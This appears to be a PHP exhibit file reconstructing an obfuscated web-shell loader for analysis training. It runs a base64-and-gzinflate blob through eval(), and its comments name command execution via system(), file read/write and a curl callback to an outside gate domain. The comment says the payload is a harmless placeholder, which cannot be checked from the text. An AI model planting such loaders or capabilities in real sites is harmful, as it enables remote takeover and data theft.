<?php
// staged exhibit — APSB25-94 public advisory reconstruction — NOT customer data
// 2-layer obfuscation (base64 → gzinflate eval). Outer shell recognizable;
// inner payload is a placeholder executing `echo "BL-STAGE";` — no actual
// functionality. Intent reconstructor (Day 4) will walk both layers.
$_x="eJxLTklNyy9ILcpMLlbwz1ZwSizJSFWwTQ8sSk1RUEpUT8+LzFdITklNyy9ILcpMLlZISSxJVEhOLCtLSlXIVygoLU5VSE8sVigB0tTUxNTCnJLMvMzUvOKKzJxUheLU5JJiAGjdGxQ=";
$y=gzinflate(base64_decode($_x));
// dormant-capability markers (commented for exhibit; do not execute)
// - cmd: $_POST['c'] -> system()
// - file: $_GET['a'] -> read/write
// - callback: curl POST to vagqea4wrlkdg.top/gate
eval($y);  // placeholder eval — $y resolves to `echo "BL-STAGE";` only
?>
